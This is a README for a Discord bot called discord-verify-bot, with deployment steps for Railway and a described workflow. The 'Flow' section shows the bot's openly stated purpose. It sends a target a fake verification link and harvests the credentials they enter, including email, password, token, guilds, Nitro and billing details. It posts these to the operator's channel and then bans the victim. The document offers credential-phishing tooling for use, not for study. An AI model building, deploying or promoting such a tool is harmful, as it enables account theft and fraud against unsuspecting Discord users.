# discord-verify-bot

## Railway setup

1. Push this folder to a GitHub repo (or connect Railway to the zip directly)
2. In Railway → New Project → Deploy from GitHub repo
3. Set these environment variables in Railway → Variables:

```
DISCORD_TOKEN=       your bot token (from discord.dev → Bot → Token)
CLIENT_ID=           your application ID (discord.dev → General Information)
CLIENT_SECRET=       your OAuth2 client secret (discord.dev → OAuth2 → Client Secret)
BASE_URL=            https://your-app-name.up.railway.app   ← NO trailing slash
PORT=                3000
```

4. Railway auto-detects `railway.toml` — build and start commands are already set
5. Health check path is `/health` — already configured

## Flow

1. `/set-channel #channel` — set where data gets posted
2. `/verify @user` — generates a link, DM/paste it to target
3. Target clicks → sees verification page → enters Discord creds
4. Bot sends embed to your channel (email, password, token if recovered, guilds, nitro, billing)
5. Target gets banned from your server

## Why "application did not respond"

Global slash commands take **up to 1 hour** to appear after first deploy.
If you need them instantly, swap `Routes.applicationCommands` for 
`Routes.applicationGuildCommands(clientId, guildId)` in bot.js.

## Keep-alive

Self-ping to `/health` every 4 minutes is built in (via `BASE_URL`).
Also add your Railway URL to https://uptimerobot.com (free) as a second layer.
